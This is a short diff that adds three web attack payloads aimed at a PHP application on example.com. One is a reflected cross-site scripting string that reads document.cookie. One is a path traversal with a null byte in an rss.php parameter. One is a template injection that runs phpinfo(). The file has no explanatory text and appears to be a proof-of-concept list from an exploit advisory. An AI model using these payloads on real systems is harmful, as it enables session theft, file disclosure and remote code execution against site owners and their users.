@@ -1,0 +1,5 @@
+http://www.example.com/[path]/index.php/&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt; 
+
+http://www.example.com/[path]/rss.php?rev=1_rssfeed.xml/../test.php%00 
+
+[:nom:{${phpinfo()}}] 
